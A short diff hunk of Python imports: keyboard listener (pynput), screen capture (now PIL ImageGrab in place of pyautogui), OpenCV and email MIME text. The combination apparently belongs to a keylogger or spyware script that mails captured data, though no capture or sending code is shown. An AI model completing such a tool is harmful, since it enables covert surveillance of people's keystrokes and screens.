@@ -16,5 +16,5 @@ from email.mime.text import MIMEText
 from time import sleep
 
 import cv2
-import pyautogui
+from PIL import ImageGrab
 from pynput.keyboard import Listener
